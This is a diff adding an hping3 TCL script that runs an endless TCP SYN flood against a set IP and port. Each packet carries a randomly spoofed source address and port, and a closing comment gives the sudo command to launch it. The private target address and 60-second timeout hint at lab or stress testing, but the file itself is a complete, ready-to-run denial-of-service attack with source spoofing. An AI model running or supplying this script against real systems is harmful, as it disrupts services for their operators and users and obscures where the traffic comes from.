@@ -1,0 +1,33 @@
+# Hping3 TCP SYN Flood with TCL script
+# TCP SYN Flood (rand source IP/port, dest port 50001, window=8192, seq=0, len=0) for hping3 TCL mode
+
+set dst_ip "192.168.100.2"
+set dst_port 50001
+set window 8192
+set seq 0
+set count 0
+
+# Function to generate random IP address
+proc random_ip {} {
+    return "[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}]"
+}
+
+# Function to generate random source port (1024–65535)
+proc random_port {} {
+    return [expr {int(rand()*64512) + 1024}]
+}
+
+while {1} {
+    set saddr [random_ip]
+    set sport [random_port]
+    # TCP SYN packet: random source IP/port, dest port 50001, window 8192, seq 0, SYN flag, no payload
+    set pkt "ip(saddr=$saddr,daddr=$dst_ip,ttl=64)+tcp(sport=$sport,dport=$dst_port,flags=s,win=$window,seq=$seq)"
+    hping send $pkt
+    incr count
+    # Print every 1000 packets sent
+    if {[expr {$count % 1000}] == 0} {
+        puts "$count TCP SYN packets sent so far..."
+    }
+}
+
+# To run: sudo timeout -s INT 60 hping3 exec tcp_syn_flood_TCL.htcl
